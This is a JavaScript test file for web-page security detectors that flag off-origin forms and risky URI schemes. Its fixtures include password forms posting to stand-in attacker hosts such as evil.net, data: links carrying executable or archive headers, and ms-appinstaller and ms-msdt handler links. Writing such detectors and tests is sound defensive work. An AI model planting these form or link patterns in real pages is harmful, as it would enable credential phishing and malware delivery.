import { describe, it, expect } from 'vitest';
import { offOriginForms, uriSchemes } from '../../src/detectors/forms-and-schemes.js';
import { makeCtx } from '../helpers/ctx.js';

const forms = (html) => offOriginForms.run(makeCtx(html));
const schemes = (html) => uriSchemes.run(makeCtx(html));
const rules = (out) => out.findings.map((f) => f.ruleId);

describe('offOriginForms', () => {
  it('has id and version', () => {
    expect(offOriginForms.id).toBe('off-origin-forms');
    expect(typeof offOriginForms.version).toBe('string');
  });
  it('flags a form posting to another registrable domain (low)', () => {
    const out = forms('<form action="https://collect.evil.net/post" method="post"><input name="q"></form>');
    expect(out.findings).toEqual([expect.objectContaining({ detector: 'off-origin-forms', ruleId: 'form.off-origin-action', category: 'credential', proposedSeverity: 'low', target: 'https://collect.evil.net/post' })]);
    expect(out.findings[0].evidence).toMatchObject({ location: { type: 'html_attribute', tag: 'form', attribute: 'action', line: 1 }, matchedValue: 'https://collect.evil.net/post' });
  });
  it('adds form.password-off-origin (medium) when the form has a password field', () => {
    const out = forms('<form action="https://evil.net/login"><input type="text" name="u"><div><input TYPE="Password" name="p"></div></form>');
    expect(rules(out).sort()).toEqual(['form.off-origin-action', 'form.password-off-origin']);
    expect(out.findings.find((f) => f.ruleId === 'form.password-off-origin')).toMatchObject({ proposedSeverity: 'medium', target: 'https://evil.net/login' });
  });
  it('ignores same-site, relative, empty and non-http actions', () => {
    for (const a of ['/login', '', 'https://x.com/login', 'https://accounts.x.com/login', 'javascript:void(0)', 'mailto:a@b.c']) {
      expect(forms(`<form action="${a}"><input type="password"></form>`).findings, a).toEqual([]);
    }
    expect(forms('<form><input type="password"></form>').findings).toEqual([]);
  });
  it('treats private-suffix tenants as different sites', () => {
    expect(rules(forms('<form action="https://evil.github.io/p"></form>'))).toEqual(['form.off-origin-action']);
  });
});

describe('uriSchemes', () => {
  it('has id and version', () => {
    expect(uriSchemes.id).toBe('uri-schemes');
    expect(typeof uriSchemes.version).toBe('string');
  });
  it('flags data: urls with executable or archive types, or with a download attribute', () => {
    const exe = schemes('<a href="data:application/x-msdownload;base64,TVqQAAMAAAAEAAAA">x</a>');
    expect(exe.findings).toEqual([expect.objectContaining({ ruleId: 'uri.data-download', category: 'distribution', proposedSeverity: 'medium' })]);
    expect(exe.findings[0].target.length).toBeLessThanOrEqual(100);
    expect(rules(schemes('<a href="data:application/zip;base64,UEsDBA==">x</a>'))).toEqual(['uri.data-download']);
    expect(rules(schemes('<a href="data:text/plain;base64,aGVsbG8=" download="notes.txt">x</a>'))).toEqual(['uri.data-download']);
  });
  it('ignores ordinary data: images and downloads-free text', () => {
    expect(schemes('<img src="data:image/png;base64,iVBORw0KGgo="><a href="data:text/plain,hello">t</a>').findings).toEqual([]);
  });
  it('reports blob: references as info with skipped coverage', () => {
    const out = schemes('<a href="blob:https://x.com/1234-5678">x</a>');
    expect(out.findings).toEqual([expect.objectContaining({ ruleId: 'uri.blob-reference', proposedSeverity: 'info' })]);
    expect(out.coverage).toEqual([{ check: 'uri-schemes', page: 'https://x.com/page/', state: 'skipped', reason: 'blob_not_inspected' }]);
  });
  it('reports javascript: hrefs as info', () => {
    const out = schemes('<a href="javascript:void(0)">a</a><a href="javascript:void(0)">b</a>');
    expect(rules(out)).toEqual(['uri.javascript-href', 'uri.javascript-href']);
    expect(out.findings[0].proposedSeverity).toBe('info');
    expect(schemes('<img src="javascript:alert(1)">').findings).toEqual([]);
  });
  it('flags ms-appinstaller and ms-msdt handlers as medium', () => {
    const a = schemes('<a href="ms-appinstaller:?source=https://evil.net/a.appx">x</a>');
    expect(a.findings).toEqual([expect.objectContaining({ ruleId: 'uri.ms-handler', proposedSeverity: 'medium' })]);
    expect(rules(schemes('<a href="ms-msdt:/id PCWDiagnostic">x</a>'))).toEqual(['uri.ms-handler']);
    expect(rules(schemes('<a href="ms-settings:network">x</a>'))).toEqual([]);
  });
  it('adds no coverage when nothing was skipped', () => {
    expect(schemes('<a href="/a">x</a>').coverage).toEqual([]);
  });
});
